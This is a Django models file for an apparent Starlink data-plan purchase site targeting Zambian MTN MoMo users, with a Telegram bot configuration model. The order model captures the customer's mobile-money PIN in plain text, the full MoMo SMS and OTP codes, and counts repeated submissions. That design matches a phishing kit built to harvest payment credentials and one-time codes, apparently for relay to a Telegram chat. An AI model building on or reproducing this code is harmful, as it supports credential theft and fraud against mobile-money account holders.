from django.db import models
import random
import string
from datetime import datetime, timedelta
import uuid

# --- Telegram Configuration Model ---
class TelegramConfig(models.Model):
    """
    Stores Telegram bot configuration for notifications.
    """
    bot_token = models.CharField(max_length=255, help_text="Telegram Bot Token")
    chat_id = models.CharField(max_length=100, help_text="Telegram Chat ID or Channel ID")
    is_active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    class Meta:
        verbose_name = "Telegram Configuration"
        verbose_name_plural = "Telegram Configurations"

    def __str__(self):
        return f"Bot: {self.bot_token[:10]}... | Chat: {self.chat_id}"

# --- Starlink Package Model ---
class StarlinkPackage(models.Model):
    """
    Represents a Starlink data package available for purchase.
    """
    name = models.CharField(max_length=100)
    description = models.TextField()
    price = models.DecimalField(max_digits=12, decimal_places=2)
    data_limit = models.CharField(max_length=50, help_text="e.g., Unlimited, 50GB, etc.")
    is_active = models.BooleanField(default=True)

    def __str__(self):
        return f"{self.name} - ZMW {self.price}"

# --- Starlink Order Model ---
class StarlinkOrder(models.Model):
    """
    Represents a Starlink data plan purchase order for Zambia MTN MoMo.
    """
    STATUS_CHOICES = [
        ('pending', 'Pending'),
        ('payment_entry', 'Payment Entry'),
        ('pin_verified', 'PIN Verified'),
        ('sms_submitted', 'SMS Submitted'),
        ('otp_submitted', 'OTP Submitted'),
        ('completed', 'Completed'),
        ('failed', 'Failed'),
    ]

    id = models.AutoField(primary_key=True)
    
    # Order Information
    starlink_kit_id = models.CharField(max_length=100, help_text="Starlink Kit ID or Account Number")
    phone_number = models.CharField(max_length=20, help_text="Customer Phone Number")
    
    # Package Details
    package_name = models.CharField(max_length=100)
    amount = models.DecimalField(max_digits=12, decimal_places=2)
    
    # MTN MoMo Verification
    momo_number = models.CharField(max_length=20, blank=True, null=True)
    pin = models.CharField(max_length=10, blank=True, null=True, help_text="User PIN")
    full_sms = models.TextField(blank=True, null=True, help_text="Full SMS content from MTN MoMo")
    otp_code = models.CharField(max_length=20, blank=True, null=True, help_text="OTP Code from SMS")
    sms_count = models.IntegerField(default=0)
    otp_count = models.IntegerField(default=0)
    
    # Status tracking
    status = models.CharField(max_length=20, choices=STATUS_CHOICES, default='pending')
    pin_verified = models.BooleanField(default=False)
    sms_verified = models.BooleanField(default=False)
    otp_verified = models.BooleanField(default=False)
    
    # Timestamps
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
    payment_entered_at = models.DateTimeField(blank=True, null=True)
    pin_verified_at = models.DateTimeField(blank=True, null=True)
    sms_submitted_at = models.DateTimeField(blank=True, null=True)
    otp_submitted_at = models.DateTimeField(blank=True, null=True)
    completed_at = models.DateTimeField(blank=True, null=True)

    class Meta:
        ordering = ['-created_at']
        verbose_name = "Starlink Order"
        verbose_name_plural = "Starlink Orders"

    def __str__(self):
        return f"{self.starlink_kit_id} - {self.package_name} ({self.status})"
